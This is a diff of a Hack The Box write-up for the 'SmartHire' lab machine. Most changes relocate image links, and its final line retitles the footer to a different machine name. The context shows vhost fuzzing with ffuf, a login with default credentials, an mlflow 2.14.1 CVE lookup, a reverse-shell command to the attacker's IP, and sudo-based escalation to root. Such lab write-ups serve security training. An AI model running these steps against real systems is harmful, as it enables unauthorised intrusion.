@@ -1,6 +1,6 @@
 ## Hack The Box - SmartHire Writeup
 
-![alt text](<Pasted image 20260922001351.png>)
+![alt text](<.image/Pasted image 20260922001351.png>)
 
 
 
@@ -30,22 +30,22 @@ Nmap done: 1 IP address (1 host up) scanned in 18.59 seconds
 
 - we have a ssh and http server open with port 80 so lets put the domain in /etc/hosts to see the web site 
 
-![alt text](<Pasted image 20260922002106.png>)
+![alt text](<.image/Pasted image 20260922002106.png>)
 
 - we have a normal web site so let's chking website maneyoual if have a email admin or something useful 
 
 ### i found a login page let's create a accunt to see what we have insed 
 
-![alt text](<Pasted image 20260922002542.png>)
+![alt text](<.image/Pasted image 20260922002542.png>)
 
 - i login with fake credanchel 
 
-![alt text](<Pasted image 20260922002758.png>)
+![alt text](<.image/Pasted image 20260922002758.png>)
 
 
 - when i login i have some dashboard and 
 
-![alt text](<Pasted image 20260922005817.png>)
+![alt text](<.image/Pasted image 20260922005817.png>)
 
 - so that is a fake upload file and is not a useful for us let's take a look in fuzing a vhost with ffuf 
 
@@ -67,7 +67,7 @@ ffuf -u http://smarthire.htb/ -H 'Host:FUZZ.smarthire.htb' -w /usr/share/wordlis
 
 **-v** : the flag for give you a full url not just a name vhost
 
-![alt text](<Pasted image 20260922011552.png>)
+![alt text](<.image/Pasted image 20260922011552.png>)
 
 - we have a lot of false positive vhost and if focus on the Size you will be see 178 in the first and second and there ... 
 
@@ -78,11 +78,11 @@ ffuf -u http://smarthire.htb/ -H 'Host:FUZZ.smarthire.htb' -w /usr/share/wordlis
 ffuf -u http://smarthire.htb/ -H 'Host:FUZZ.smarthire.htb' -w /usr/share/wordlists/dirb/big.txt -c -v -fs 178
 ```
 
-![alt text](<Pasted image 20260922013043.png>)
+![alt text](<.image/Pasted image 20260922013043.png>)
 
 when you filter the size you will be see a vhost name models and you need to add to /ect/hosts
 
-![alt text](<Pasted image 20260924002125.png>)
+![alt text](<.image/Pasted image 20260924002125.png>)
 
 we need to set a credential to login into server let's use random username and password like 
 `admin:admin`
@@ -95,12 +95,12 @@ when i try `admin` `password` on the pop pop he work
 
 ### search version of software 
 
-![alt text](<Pasted image 20260922013250.png>)
+![alt text](<.image/Pasted image 20260922013250.png>)
 
 - we have a version with `mlflow 2.14.1` and you need to search it on google by use  
 `mlflow 2.14.1 cve` 
 
-![alt text](<Pasted image 20260922013619.png>)
+![alt text](<.image/Pasted image 20260922013619.png>)
 
 ### exploit the vulnerability
 
@@ -131,7 +131,7 @@ revshell 10.10.10.10 4444
 
 lady and gentlemen we got him
 
-![alt text](<Pasted image 20260925011414.png>)
+![alt text](<.image/Pasted image 20260925011414.png>)
 
 ```bash
 cd /home
@@ -287,16 +287,16 @@ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
 
 we are a root and you can submit the root flag 
 
-![alt text](<Pasted image 20260926193635.png>)
+![alt text](<.image/Pasted image 20260926193635.png>)
 
 ```bash
 cat /root/root.txt 
 HTB{............................}
 ```
 
-![alt text](<Pasted image 20260926194546.png>)
+![alt text](<.image/Pasted image 20260926194546.png>)
 
 
 tank you @hachthebox for the machine 
-#   w r i t e u p - S m a r t H i r e - H a c k T h e b o x -  
+#   w r i t e u p - s i l e n t i u m - H a c k T h e b o x -  
  
